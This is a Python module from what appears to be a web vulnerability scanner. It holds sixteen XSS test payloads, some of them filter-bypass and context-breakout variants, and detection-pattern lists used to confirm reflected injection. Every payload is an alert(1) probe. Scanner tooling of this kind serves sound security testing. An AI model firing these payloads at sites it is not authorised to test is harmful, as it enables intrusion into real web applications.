"""
scanner/payloads/xss.py

XSS (Cross-Site Scripting) payloads for vulnerability testing.
Includes: Reflected XSS, DOM-based XSS contexts
"""

from .base import Payload


def xss_confirm(response_text: str) -> bool:
    """
    Check for XSS patterns in response.
    More comprehensive than exact match.
    """
    xss_indicators = [
        # Script execution
        "<script>",
        "<script ",
        "</script>",
        "javascript:",
        
        # Event handlers
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "onfocus=",
        "onblur=",
        "onchange=",
        "onsubmit=",
        
        # SVG/HTML injection
        "<svg",
        "<img",
        "<iframe",
        "<body",
        "<input",
        
        # Common XSS functions
        "alert(",
        "confirm(",
        "prompt(",
        "eval(",
        "document.cookie",
        "document.location",
        "window.location",
    ]
    
    text_lower = response_text.lower()
    return any(indicator.lower() in text_lower for indicator in xss_indicators)


def xss_context_attribute(response_text: str) -> bool:
    """Check for XSS in HTML attribute context."""
    indicators = [
        '" onload=',
        "' onload=",
        '" onerror=',
        "' onerror=",
        '" onclick=',
        "autofocus onfocus=",
    ]
    text_lower = response_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


def xss_context_js(response_text: str) -> bool:
    """Check for XSS in JavaScript context."""
    indicators = [
        "'-alert(",
        '"-alert(',
        ";</script>",
        "//</script>",
    ]
    return any(ind in response_text for ind in indicators)


XSS_PAYLOADS = [
    # ============================================
    # BASIC REFLECTED XSS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Basic script tag",
        payload='<script>alert(1)</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG onload",
        payload='"><svg/onload=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="IMG onerror",
        payload='"><img src=x onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Body onload",
        payload='"><body onload=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    
    # ============================================
    # ATTRIBUTE CONTEXT ESCAPING
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Double quote escape",
        payload='" onmouseover="alert(1)" x="',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="Single quote escape",
        payload="' onmouseover='alert(1)' x='",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="Autofocus onfocus",
        payload='" autofocus onfocus="alert(1)" x="',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    
    # ============================================
    # JAVASCRIPT CONTEXT
    # ============================================
    Payload(
        vuln_type="XSS",
        name="JS string break single",
        payload="'-alert(1)-'",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_js
    ),
    Payload(
        vuln_type="XSS",
        name="JS string break double",
        payload='"-alert(1)-"',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_js
    ),
    Payload(
        vuln_type="XSS",
        name="Script tag break",
        payload='</script><script>alert(1)</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    
    # ============================================
    # ENCODED VARIANTS (Filter Bypass)
    # ============================================
    Payload(
        vuln_type="XSS",
        name="URL encoded script",
        payload='%3Cscript%3Ealert(1)%3C/script%3E',
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="HTML entity bypass",
        payload='&lt;script&gt;alert(1)&lt;/script&gt;',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Case variation",
        payload='<ScRiPt>alert(1)</sCrIpT>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    
    # ============================================
    # EVENT HANDLER VARIANTS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Input autofocus",
        payload='<input autofocus onfocus=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Details ontoggle",
        payload='<details open ontoggle=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Video source error",
        payload='<video><source onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
]